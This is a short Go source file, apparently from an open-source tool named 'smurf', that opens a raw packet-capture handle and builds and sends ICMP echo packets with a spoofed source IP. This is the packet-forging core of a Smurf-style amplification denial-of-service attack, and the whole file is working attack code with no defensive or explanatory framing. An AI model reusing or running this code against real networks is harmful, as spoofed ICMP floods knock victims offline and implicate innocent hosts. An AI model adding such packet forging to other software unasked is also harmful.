package main

import (
	"net"

	"github.com/adrianosela/smurf/payloads"
	"github.com/google/gopacket/pcap"
	"github.com/pkg/errors"
)

type smurf struct {
	wire    *pcap.Handle
	payload []byte
}

func newSmurf(sIP, dIP net.IP, iface string, gwMAC net.HardwareAddr) (*smurf, error) {
	wire, err := pcap.OpenLive(iface, 1024, false, pcap.BlockForever)
	if err != nil {
		return nil, errors.Wrap(err, "could not open live")
	}
	nif, err := net.InterfaceByName(iface)
	if err != nil {
		return nil, errors.Wrap(err, "could not get outbound interface")
	}
	payload, err := payloads.Build(payloads.TypeICMPEcho, payloads.Config{
		SrcIP:  sIP,
		DstIP:  dIP,
		SrcMAC: nif.HardwareAddr,
		DstMAC: gwMAC,
	})
	if err != nil {
		return nil, errors.Wrap(err, "could not build a spoofed payload")
	}
	return &smurf{
		wire:    wire,
		payload: payload,
	}, nil
}

func (s *smurf) execute() error {
	return s.wire.WritePacketData(s.payload)
}

func (s *smurf) close() {
	s.wire.Close()
}
